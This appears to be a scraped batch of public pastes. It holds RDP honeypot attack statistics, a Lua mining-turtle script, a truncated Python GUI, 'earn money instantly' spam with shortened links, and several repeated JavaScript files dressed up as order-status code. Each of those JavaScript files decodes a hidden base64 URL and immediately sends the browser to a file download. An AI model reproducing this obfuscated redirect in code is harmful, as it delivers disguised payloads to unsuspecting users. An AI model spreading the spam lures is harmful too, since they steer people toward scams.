id,title,username,language,date,content
3SeJGBrC,Products.js,WassupDog45,JavaScript,Thursday 10th of April 2025 07:21:19 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45063/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MqJgLwWB,2025-04-10_stats.json,rdp_snitch,JSON,Thursday 10th of April 2025 07:18:34 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 37950,
    ""150.95.30.49"": 15723,
    ""106.14.144.233"": 426,
    ""45.156.128.81"": 18,
    ""194.165.16.167"": 6,
    ""91.238.181.92"": 6,
    ""159.89.6.147"": 1440,
    ""92.255.85.92"": 6,
    ""198.235.24.65"": 9,
    ""157.245.104.150"": 3,
    ""62.60.188.24"": 6,
    ""68.183.179.179"": 483,
    ""103.97.93.115"": 18,
    ""205.210.31.64"": 9,
    ""58.218.199.219"": 15,
    ""80.66.79.30"": 288,
    ""45.227.254.132"": 9,
    ""198.235.24.124"": 9,
    ""178.128.98.159"": 288,
    ""152.32.198.210"": 3,
    ""194.165.16.165"": 6,
    ""118.194.248.4"": 3,
    ""88.214.25.125"": 6,
    ""42.96.5.120"": 3,
    ""198.235.24.44"": 9,
    ""167.94.138.197"": 3
  },
  ""asn"": {
    ""AS60068"": 37950,
    ""AS135161"": 15723,
    ""AS37963"": 426,
    ""AS211680"": 18,
    ""AS48721"": 12,
    ""AS49434"": 6,
    ""AS14061"": 2214,
    ""AS207566"": 6,
    ""AS396982"": 36,
    ""AS215930"": 6,
    ""AS134053"": 18,
    ""AS4134"": 15,
    ""AS60602"": 288,
    ""AS267784"": 9,
    ""AS135377"": 6,
    ""AS35042"": 6,
    ""AS135967"": 3,
    ""AS398324"": 3
  },
  ""isp"": {
    ""DataCamp Limited"": 37950,
    ""GMO-Z.COM PTE. LTD."": 15723,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""NSEC - Sistemas Informaticos, S.A."": 18,
    ""Flyservers S.A."": 21,
    ""Datacenter location PAR1 France"": 6,
    ""DigitalOcean, LLC"": 2214,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Google LLC"": 36,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 18,
    ""Chinanet"": 15,
    ""HYPER-HOSTING"": 288,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Bach Kim Network solutions Join stock company"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""Cdn77 SGP"": 37950,
    ""Zcom Thai"": 15723,
    ""Aliyun Computing Co., LTD"": 426,
    ""Inap AMS"": 18,
    ""Flyservers S.A"": 12,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""DigitalOcean, LLC"": 1926,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""UAB Host Baltic"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 18,
    ""Chinanet JS"": 15,
    ""Hyper Hosting SRL"": 288,
    ""Xwin Universal LTD"": 9,
    ""Digitalocean"": 288,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Ucloud Information Technology"": 3,
    ""Bach Kim Network solutions Join stock company"": 3,
    ""Censys, Inc"": 3
  },
  ""regionName"": {
    ""North West"": 37950,
    ""Bangkok"": 15723,
    ""Shanghai"": 426,
    ""North Holland"": 18,
    ""Kaunas"": 12,
    ""\u00cele-de-France"": 6,
    ""Hesse"": 1440,
    ""Moscow"": 6,
    ""California"": 36,
    ""Karnataka"": 3,
    ""Tehran"": 6,
    ""South West"": 771,
    ""Goa"": 18,
    ""Jiangsu"": 15,
    ""Chi\u0219in\u0103u Municipality"": 288,
    ""Vilnius"": 9,
    ""England"": 3,
    ""Seoul"": 3,
    ""Kowloon City"": 6,
    ""Ninh B\u00ecnh Province"": 3,
    ""Michigan"": 3
  },
  ""country"": {
    ""Singapore"": 38721,
    ""Thailand"": 15723,
    ""China"": 441,
    ""The Netherlands"": 18,
    ""Lithuania"": 21,
    ""France"": 6,
    ""Germany"": 1440,
    ""Russia"": 6,
    ""United States"": 39,
    ""India"": 21,
    ""Iran"": 6,
    ""Moldova"": 288,
    ""United Kingdom"": 3,
    ""South Korea"": 3,
    ""Hong Kong"": 6,
    ""Vietnam"": 3
  },
  ""account"": {
    ""hello"": 56640,
    ""root"": 18,
    ""Test"": 30,
    ""zSCdDLSbZ"": 3,
    ""LELAHv"": 3,
    ""xbwkyr"": 3,
    ""pwKvdUkzE"": 3,
    ""KfuJpr"": 3,
    ""mcdEUt"": 3,
    ""Domain"": 9,
    ""yGZehTPig"": 3,
    ""TDYeOH"": 3,
    ""tDDRoc"": 3,
    ""Administrator"": 6,
    ""(empty)"": 6,
    ""mdTDPyiAf"": 3,
    ""mrusIT"": 3,
    ""btIOmt"": 3
  },
  ""keyboard"": {
    ""Unknown"": 56745
  },
  ""client_build"": {
    ""Unknown"": 56745
  },
  ""client_name"": {
    ""Unknown"": 56745
  },
  ""ip_type"": {
    ""hosting & proxy"": 38379,
    ""hosting"": 18270,
    ""proxy"": 39,
    ""Unknown"": 57
  }
}"
GNGZ7hEe,2025-04-10_stats.json,rdp_snitch,JSON,Thursday 10th of April 2025 07:16:23 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 25300,
    ""150.95.30.49"": 10482,
    ""106.14.144.233"": 284,
    ""45.156.128.81"": 12,
    ""194.165.16.167"": 4,
    ""91.238.181.92"": 4,
    ""159.89.6.147"": 960,
    ""92.255.85.92"": 4,
    ""198.235.24.65"": 6,
    ""157.245.104.150"": 2,
    ""62.60.188.24"": 4,
    ""68.183.179.179"": 322,
    ""103.97.93.115"": 12,
    ""205.210.31.64"": 6,
    ""58.218.199.219"": 10,
    ""80.66.79.30"": 192,
    ""45.227.254.132"": 6,
    ""198.235.24.124"": 6,
    ""178.128.98.159"": 192,
    ""152.32.198.210"": 2,
    ""194.165.16.165"": 4,
    ""118.194.248.4"": 2,
    ""88.214.25.125"": 4,
    ""42.96.5.120"": 2,
    ""198.235.24.44"": 6,
    ""167.94.138.197"": 2
  },
  ""asn"": {
    ""AS60068"": 25300,
    ""AS135161"": 10482,
    ""AS37963"": 284,
    ""AS211680"": 12,
    ""AS48721"": 8,
    ""AS49434"": 4,
    ""AS14061"": 1476,
    ""AS207566"": 4,
    ""AS396982"": 24,
    ""AS215930"": 4,
    ""AS134053"": 12,
    ""AS4134"": 10,
    ""AS60602"": 192,
    ""AS267784"": 6,
    ""AS135377"": 4,
    ""AS35042"": 4,
    ""AS135967"": 2,
    ""AS398324"": 2
  },
  ""isp"": {
    ""DataCamp Limited"": 25300,
    ""GMO-Z.COM PTE. LTD."": 10482,
    ""Hangzhou Alibaba Advertising Co"": 284,
    ""NSEC - Sistemas Informaticos, S.A."": 12,
    ""Flyservers S.A."": 14,
    ""Datacenter location PAR1 France"": 4,
    ""DigitalOcean, LLC"": 1476,
    ""Chang Way Technologies Co. Limited"": 4,
    ""Google LLC"": 24,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 4,
    ""Ethernet Xpress Pvt. Ltd."": 12,
    ""Chinanet"": 10,
    ""HYPER-HOSTING"": 192,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 4,
    ""NOC EMAIL: noc@one-host.net"": 4,
    ""Bach Kim Network solutions Join stock company"": 2,
    ""Censys, Inc."": 2
  },
  ""org"": {
    ""Cdn77 SGP"": 25300,
    ""Zcom Thai"": 10482,
    ""Aliyun Computing Co., LTD"": 284,
    ""Inap AMS"": 12,
    ""Flyservers S.A"": 8,
    ""ThinkTech Technology Industrial CO. Limited"": 8,
    ""DigitalOcean, LLC"": 1284,
    ""Chang Way Technologies Co. Limited"": 4,
    ""Palo Alto Networks, Inc"": 24,
    ""UAB Host Baltic"": 4,
    ""Ethernet Xpress Pvt. Ltd."": 12,
    ""Chinanet JS"": 10,
    ""Hyper Hosting SRL"": 192,
    ""Xwin Universal LTD"": 6,
    ""Digitalocean"": 192,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Ucloud Information Technology"": 2,
    ""Bach Kim Network solutions Join stock company"": 2,
    ""Censys, Inc"": 2
  },
  ""regionName"": {
    ""North West"": 25300,
    ""Bangkok"": 10482,
    ""Shanghai"": 284,
    ""North Holland"": 12,
    ""Kaunas"": 8,
    ""\u00cele-de-France"": 4,
    ""Hesse"": 960,
    ""Moscow"": 4,
    ""California"": 24,
    ""Karnataka"": 2,
    ""Tehran"": 4,
    ""South West"": 514,
    ""Goa"": 12,
    ""Jiangsu"": 10,
    ""Chi\u0219in\u0103u Municipality"": 192,
    ""Vilnius"": 6,
    ""England"": 2,
    ""Seoul"": 2,
    ""Kowloon City"": 4,
    ""Ninh B\u00ecnh Province"": 2,
    ""Michigan"": 2
  },
  ""country"": {
    ""Singapore"": 25814,
    ""Thailand"": 10482,
    ""China"": 294,
    ""The Netherlands"": 12,
    ""Lithuania"": 14,
    ""France"": 4,
    ""Germany"": 960,
    ""Russia"": 4,
    ""United States"": 26,
    ""India"": 14,
    ""Iran"": 4,
    ""Moldova"": 192,
    ""United Kingdom"": 2,
    ""South Korea"": 2,
    ""Hong Kong"": 4,
    ""Vietnam"": 2
  },
  ""account"": {
    ""hello"": 37760,
    ""root"": 12,
    ""Test"": 20,
    ""zSCdDLSbZ"": 2,
    ""LELAHv"": 2,
    ""xbwkyr"": 2,
    ""pwKvdUkzE"": 2,
    ""KfuJpr"": 2,
    ""mcdEUt"": 2,
    ""Domain"": 6,
    ""yGZehTPig"": 2,
    ""TDYeOH"": 2,
    ""tDDRoc"": 2,
    ""Administrator"": 4,
    ""(empty)"": 4,
    ""mdTDPyiAf"": 2,
    ""mrusIT"": 2,
    ""btIOmt"": 2
  },
  ""keyboard"": {
    ""Unknown"": 37830
  },
  ""client_build"": {
    ""Unknown"": 37830
  },
  ""client_name"": {
    ""Unknown"": 37830
  },
  ""ip_type"": {
    ""hosting & proxy"": 25586,
    ""hosting"": 12180,
    ""proxy"": 26,
    ""Unknown"": 38
  }
}"
kMTy9kGF,2025-04-10_stats.json,rdp_snitch,JSON,Thursday 10th of April 2025 07:15:11 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 12650,
    ""150.95.30.49"": 5241,
    ""106.14.144.233"": 142,
    ""45.156.128.81"": 6,
    ""194.165.16.167"": 2,
    ""91.238.181.92"": 2,
    ""159.89.6.147"": 480,
    ""92.255.85.92"": 2,
    ""198.235.24.65"": 3,
    ""157.245.104.150"": 1,
    ""62.60.188.24"": 2,
    ""68.183.179.179"": 161,
    ""103.97.93.115"": 6,
    ""205.210.31.64"": 3,
    ""58.218.199.219"": 5,
    ""80.66.79.30"": 96,
    ""45.227.254.132"": 3,
    ""198.235.24.124"": 3,
    ""178.128.98.159"": 96,
    ""152.32.198.210"": 1,
    ""194.165.16.165"": 2,
    ""118.194.248.4"": 1,
    ""88.214.25.125"": 2,
    ""42.96.5.120"": 1,
    ""198.235.24.44"": 3,
    ""167.94.138.197"": 1
  },
  ""asn"": {
    ""AS60068"": 12650,
    ""AS135161"": 5241,
    ""AS37963"": 142,
    ""AS211680"": 6,
    ""AS48721"": 4,
    ""AS49434"": 2,
    ""AS14061"": 738,
    ""AS207566"": 2,
    ""AS396982"": 12,
    ""AS215930"": 2,
    ""AS134053"": 6,
    ""AS4134"": 5,
    ""AS60602"": 96,
    ""AS267784"": 3,
    ""AS135377"": 2,
    ""AS35042"": 2,
    ""AS135967"": 1,
    ""AS398324"": 1
  },
  ""isp"": {
    ""DataCamp Limited"": 12650,
    ""GMO-Z.COM PTE. LTD."": 5241,
    ""Hangzhou Alibaba Advertising Co"": 142,
    ""NSEC - Sistemas Informaticos, S.A."": 6,
    ""Flyservers S.A."": 7,
    ""Datacenter location PAR1 France"": 2,
    ""DigitalOcean, LLC"": 738,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Google LLC"": 12,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 2,
    ""Ethernet Xpress Pvt. Ltd."": 6,
    ""Chinanet"": 5,
    ""HYPER-HOSTING"": 96,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""NOC EMAIL: noc@one-host.net"": 2,
    ""Bach Kim Network solutions Join stock company"": 1,
    ""Censys, Inc."": 1
  },
  ""org"": {
    ""Cdn77 SGP"": 12650,
    ""Zcom Thai"": 5241,
    ""Aliyun Computing Co., LTD"": 142,
    ""Inap AMS"": 6,
    ""Flyservers S.A"": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""DigitalOcean, LLC"": 642,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""UAB Host Baltic"": 2,
    ""Ethernet Xpress Pvt. Ltd."": 6,
    ""Chinanet JS"": 5,
    ""Hyper Hosting SRL"": 96,
    ""Xwin Universal LTD"": 3,
    ""Digitalocean"": 96,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Ucloud Information Technology"": 1,
    ""Bach Kim Network solutions Join stock company"": 1,
    ""Censys, Inc"": 1
  },
  ""regionName"": {
    ""North West"": 12650,
    ""Bangkok"": 5241,
    ""Shanghai"": 142,
    ""North Holland"": 6,
    ""Kaunas"": 4,
    ""\u00cele-de-France"": 2,
    ""Hesse"": 480,
    ""Moscow"": 2,
    ""California"": 12,
    ""Karnataka"": 1,
    ""Tehran"": 2,
    ""South West"": 257,
    ""Goa"": 6,
    ""Jiangsu"": 5,
    ""Chi\u0219in\u0103u Municipality"": 96,
    ""Vilnius"": 3,
    ""England"": 1,
    ""Seoul"": 1,
    ""Kowloon City"": 2,
    ""Ninh B\u00ecnh Province"": 1,
    ""Michigan"": 1
  },
  ""country"": {
    ""Singapore"": 12907,
    ""Thailand"": 5241,
    ""China"": 147,
    ""The Netherlands"": 6,
    ""Lithuania"": 7,
    ""France"": 2,
    ""Germany"": 480,
    ""Russia"": 2,
    ""United States"": 13,
    ""India"": 7,
    ""Iran"": 2,
    ""Moldova"": 96,
    ""United Kingdom"": 1,
    ""South Korea"": 1,
    ""Hong Kong"": 2,
    ""Vietnam"": 1
  },
  ""account"": {
    ""hello"": 18880,
    ""root"": 6,
    ""Test"": 10,
    ""zSCdDLSbZ"": 1,
    ""LELAHv"": 1,
    ""xbwkyr"": 1,
    ""pwKvdUkzE"": 1,
    ""KfuJpr"": 1,
    ""mcdEUt"": 1,
    ""Domain"": 3,
    ""yGZehTPig"": 1,
    ""TDYeOH"": 1,
    ""tDDRoc"": 1,
    ""Administrator"": 2,
    ""(empty)"": 2,
    ""mdTDPyiAf"": 1,
    ""mrusIT"": 1,
    ""btIOmt"": 1
  },
  ""keyboard"": {
    ""Unknown"": 18915
  },
  ""client_build"": {
    ""Unknown"": 18915
  },
  ""client_name"": {
    ""Unknown"": 18915
  },
  ""ip_type"": {
    ""hosting & proxy"": 12793,
    ""hosting"": 6090,
    ""proxy"": 13,
    ""Unknown"": 19
  }
}"
fKsYhS2V,EARN $900 INSTANTLY 2025 2U,poopface455,JavaScript,Thursday 10th of April 2025 07:09:43 PM CDT," 
Pdf https://tinyurl.com/privguidee


GTHgx5GrF5
"
mJvc8nN7,Order.js,WassupDog45,JavaScript,Thursday 10th of April 2025 07:05:56 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/53734/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KjbL5s9f,Make $1000 15-MINUTES (BEGINNER) FM,poopface455,JavaScript,Thursday 10th of April 2025 06:56:20 PM CDT," 
Pdf https://tinyurl.com/privguidee


CgC2EXXpc1
"
VrpR6hUG,Market.js,WassupDog45,JavaScript,Thursday 10th of April 2025 06:50:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24512/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
f4mYjbLs,EARN $900 INSTANTLY 2025⭐ G8,poopface455,JavaScript,Thursday 10th of April 2025 06:42:56 PM CDT," 
Pdf https://tinyurl.com/privguidee


gQbC1NxL2Z
"
JQudCfnB,Untitled,WassupDog45,JavaScript,Thursday 10th of April 2025 06:35:05 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10084/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HzHXU6Zc,Make $1000 15-MINUTES (BEGINNER) FM,DHGDTRFGETFRE6,JavaScript,Thursday 10th of April 2025 06:28:09 PM CDT," 
Pdf https://tinyurl.com/privguidee


Z8QwCAh2Rp
"
RdYBw2E1,Products.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 06:19:40 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/57686/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zQCzukP5,Chunk Eater,ZGAMMAA,Lua,Thursday 10th of April 2025 06:09:31 PM CDT,"-- 🧱 CHUNK EATER: FINAL LOCKED VERSION
-- Digs a 16x16 chunk in 3-block layers, returns to origin to refuel/unload

-- === CONFIG ===
local CHUNK_SIZE = 16
local LAYER_HEIGHT = 3
local FUEL_BUFFER = 100
-- ==============

-- Position & Direction Tracking
local x, y, z = 0, 0, 0
local dir = 1 -- 0 = north, 1 = east, 2 = south, 3 = west

-- === DIRECTION HELPERS ===
local function turnRight() turtle.turnRight(); dir = (dir + 1) % 4 end
local function turnLeft() turtle.turnLeft(); dir = (dir - 1) % 4 end
local function face(target) while dir ~= target do turnRight() end end
local function faceExact(targetDir) while dir ~= targetDir do turnRight() end end

-- === POSITION TRACKING ===
local function updatePosition(dx, dy, dz)
  x, y, z = x + dx, y + dy, z + dz
end

-- === RETURN TO ORIGIN ===
local function returnToOrigin()
  face(3) while x > 0 do turtle.back(); updatePosition(-1, 0, 0) end
  face(2) while z > 0 do turtle.back(); updatePosition(0, 0, -1) end
  while y > 0 do tryUp() end
end

local function goTo(xT, yT, zT)
  while y < yT do tryDown() end
  face(1) while x < xT do tryForward() end
  face(3) while x > xT do turtle.back(); updatePosition(-1, 0, 0) end
  face(2) while z < zT do tryForward() end
  face(0) while z > zT do turtle.back(); updatePosition(0, 0, -1) end
end

-- === REFUELING ===
local function refuelFromInventory()
  for i = 1, 16 do
    turtle.select(i)
    if turtle.refuel(0) then
      turtle.refuel()
      return true
    end
  end
  return false
end

local function tryRefuelFromSurroundings()
  for i = 1, 4 do
    if turtle.suck(1) then
      if turtle.refuel(1) then
        return true
      else
        turtle.drop()
      end
    end
    turtle.turnRight()
    dir = (dir + 1) % 4
  end
  return false
end

local function checkFuel()
  local estReturn = math.abs(x) + math.abs(y) + math.abs(z) + FUEL_BUFFER
  if turtle.getFuelLevel() < estReturn then
    local sx, sy, sz, sd = x, y, z, dir
    print(""⚠️ Low fuel. Returning to refuel..."")
    returnToOrigin()
    while not refuelFromInventory() do
      if tryRefuelFromSurroundings() then break end
      print(""⌛ Waiting for fuel..."")
      sleep(2)
    end
    goTo(sx, sy, sz)
    faceExact(sd)
  end
end

-- === MOVEMENT ===
local function tryForward()
  checkFuel()
  while not turtle.forward() do
    turtle.dig()
    sleep(0.3)
  end
  turtle.digUp()
  turtle.digDown()
  if dir == 0 then updatePosition(0, 0, -1)
  elseif dir == 1 then updatePosition(1, 0, 0)
  elseif dir == 2 then updatePosition(0, 0, 1)
  elseif dir == 3 then updatePosition(-1, 0, 0)
  end
end

local function tryUp()
  checkFuel()
  while not turtle.up() do
    turtle.digUp()
    sleep(0.3)
  end
  updatePosition(0, -1, 0)
end

local function tryDown()
  checkFuel()
  while not turtle.down() do
    turtle.digDown()
    sleep(0.3)
  end
  updatePosition(0, 1, 0)
end

-- === INVENTORY ===
local function isFull()
  for i = 1, 16 do
    if turtle.getItemCount(i) == 0 then return false end
  end
  return true
end

local function unloadInventory()
  for i = 1, 16 do
    turtle.select(i)
    turtle.drop()
  end
end

-- === DIG ONE LAYER ===
local function digLayer()
  for row = 1, CHUNK_SIZE do
    for col = 1, CHUNK_SIZE - 1 do
      tryForward()
      if isFull() then
        local sx, sy, sz, sd = x, y, z, dir
        print(""📦 Inventory full. Returning to dump..."")
        returnToOrigin()
        unloadInventory()
        checkFuel()
        goTo(sx, sy, sz)
        faceExact(sd)
      end
    end
    if row < CHUNK_SIZE then
      if row % 2 == 1 then turnRight(); tryForward(); turnRight()
      else turnLeft(); tryForward(); turnLeft()
      end
    end
  end

  -- ✅ Return to (0, y, 0) and face East
  print(""🔁 Returning to origin column..."")
  if x > 0 then face(3) while x > 0 do turtle.back(); updatePosition(-1, 0, 0) end end
  if x < 0 then face(1) while x < 0 do turtle.back(); updatePosition(1, 0, 0) end end
  if z > 0 then face(0) while z > 0 do turtle.back(); updatePosition(0, 0, -1) end end
  if z < 0 then face(2) while z < 0 do turtle.back(); updatePosition(0, 0, 1) end end
  face(1) -- Always reset to East

  -- Final safety check
  assert(x == 0 and z == 0, ""❌ ERROR: Turtle left the chunk!"")
  print(""📍 At x=""..x.."", y=""..y.."", z=""..z.."" | Facing=""..dir)
end

-- === MAIN ===
print(""Enter depth to dig:"")
local depth = tonumber(read())
if not depth or depth <= 0 then
  print(""❌ Invalid depth."")
  return
end

for layer = 1, depth, LAYER_HEIGHT do
  digLayer()
  if layer + LAYER_HEIGHT <= depth then
    print(""⬇️ Descending to next layer..."")
    for i = 1, LAYER_HEIGHT do tryDown() end
  end
end

returnToOrigin()
unloadInventory()
print(""✅ Chunk excavation complete. Turtle returned to origin."")
"
UA8mreJH,Order.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 06:04:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/87985/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UspgqgW8,Market.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 05:48:47 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/82092/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UbDVUK9K,pyGUI_CineFrameSaver,creativesamurai1982,Python,Thursday 10th of April 2025 05:41:34 PM CDT,"import cv2
import numpy as np
import os
import threading
import time
import tkinter as tk
from tkinter import ttk, Frame, Label, Canvas, Spinbox, messagebox, filedialog, Scrollbar
from PIL import Image, ImageTk
import imghdr

# =============================================================================
# Global Settings and Variables
# =============================================================================
DEBUG_MODE = True  # Toggle debugging messages

def debug_print(message):
    """"""Print debugging messages if DEBUG_MODE is enabled.""""""
    if DEBUG_MODE:
        print(message)

debug_print(""🔍 DEBUG ENABLED"")

# Global state variables and configuration
image_display = None         # Tkinter image for current preview display
processed_image = None       # Processed image used for display
latest_image_path = None     # Latest loaded image (currently unused)
lock = threading.Lock()      # For thread safety
debounce_time = 0            # Timestamp for debouncing slider changes
display_mode = None          # Tkinter StringVar for display mode selection
threshold_value = 205        # Default threshold for image processing

